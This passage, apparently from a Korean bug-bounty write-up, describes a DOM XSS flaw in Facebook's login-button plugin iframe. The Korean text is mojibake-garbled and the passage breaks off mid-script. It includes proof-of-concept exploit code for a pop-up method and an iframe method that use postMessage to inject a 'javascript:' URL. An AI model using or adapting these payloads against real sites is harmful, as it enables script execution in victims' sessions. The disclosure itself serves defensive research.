class=&quot;mi&quot;&gt;971&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}})},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;APP_DOMAIN&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â†“&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ìœ ì €ê°€ Login with Facebook ë²„íŠ¼ì„ í´ë¦­í•˜ë©´ proxy iframeì—ì„œ íŠ¹ì • URLì„ open í•©ë‹ˆë‹¤.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â†“&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// íŒì—… ìœˆë„ìš°ëŠ” accesstokenê³¼ signed-requestë¥¼ third-party websiteì—ê²Œ postMessageë¥¼ ì‚¬ìš©í•˜ì—¬ ë³´ëƒ…ë‹ˆë‹¤.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•´ë‹¹ ì´ˆê¸°í™” payloadë¥¼ ì£¼ì˜ ê¹Šê²Œ ì‚´í´ë³´ë©´ SDKê°€ Facebook í”ŒëŸ¬ê·¸ì¸ iframeìœ¼ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. url íŒŒë¼ë¯¸í„°ëŠ” ië¼ëŠ” ë³€ìˆ˜ì— ì €ì¥ ë˜ë©° ë²„íŠ¼ì´ í´ë¦­ ë˜ì–´ ì´ë²¤íŠ¸ê°€ íŠ¸ë¦¬ê±° ë  ë•Œ ì•„ë˜ í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png&quot; alt=&quot;/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/cbt=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cbt=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;buildPopupFeatureString&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ Javascript ì½”ë“œë¥¼ ë³´ì•˜ì„ ë•Œ ë‚˜ëŠ” â€œë¬´ì–¸ê°€ ì™”êµ¬ë‚˜! ì·¨ì•½ì ì´ ë‚´ê²Œ ì™”êµ¬ë‚˜! ğŸ˜‰â€ë¥¼ ëŠê¼ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì™œëƒí•˜ë©´ Javascript ì½”ë“œì—ëŠ” URL/Scheme ìœ íš¨ì„± ê²€ì‚¬ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì´ DOM XSSë¥¼ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;window.open('javascript:alert(document.domain)')&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ê·¸ë˜ì„œ ìš°ë¦¬ê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;url:'javascript:alert(document.domain)'&lt;/code&gt;ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ëŠ” ê²½ìš° ë°›ëŠ” ì‚¬ëŒì€ iframeì´ &lt;a href=&quot;https://www.facebook.com/v6.0/plugins/login_button.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.facebook.com/v6.0/plugins/login_button.php&lt;/code&gt;&lt;/a&gt;ë¥¼ ë°©ë¬¸í•˜ê³  ì‚¬ìš©ìê°€ &lt;code class=&quot;highlighter-rouge&quot;&gt;Continue With Facebook&lt;/code&gt;ë²„íŠ¼ì„ í´ë¦­í•˜ê²Œ ë˜ë©´  &lt;a href=&quot;http://facebook.com/&quot;&gt;facebook.com&lt;/a&gt; ë„ë©”ì¸ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;javascript:alert(document.domain)&lt;/code&gt;ì™€ ê°™ì€ Javascriptê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;exploiting-the-iframe&quot;&gt;Exploiting the Iframe&lt;/h2&gt;

&lt;p&gt;ìœ„ ë³´ì•ˆ ì´ìŠˆë¥¼ í†µí•´ ìµìŠ¤í”Œë¡œì‡ í•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;1-pop-up-method&quot;&gt;1. Pop-up Method&lt;/h3&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   
   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opener&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;amp;auto_logout_link=false&amp;amp;button_type=continue_with&amp;amp;channel=REDIRECT_URL&amp;amp;container_width=734&amp;amp;locale=en_US&amp;amp;sdk=joey&amp;amp;size=large&amp;amp;use_continue_as=true&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   
   &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdArbiterHandleMessage&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;loginButtonStateInit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;javascript:alert(document.domain);&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;dims&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenY&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;971&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}})},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ORIGIN&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;4000&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-iframe-method&quot;&gt;2. Iframe Method&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; ë˜ëŠ” CSP &lt;code class=&quot;highlighter-rouge&quot;&gt;frame-ancestors&lt;/code&gt; í—¤ë”ê°€ ëˆ„ë½ ë˜ì—ˆìœ¼ë¯€ë¡œ ì´ í˜ì´ì§€ëŠ” ê³µê²©ìì˜ í˜ì´ì§€ì— ì‰½ê²Œ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fbFrameLoaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iframeEl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;fbframe&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdArbiterHandleMessage&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;loginButtonStateInit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;javascript:alert(document.domain);&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;dims&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenY&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;971&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}})},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span 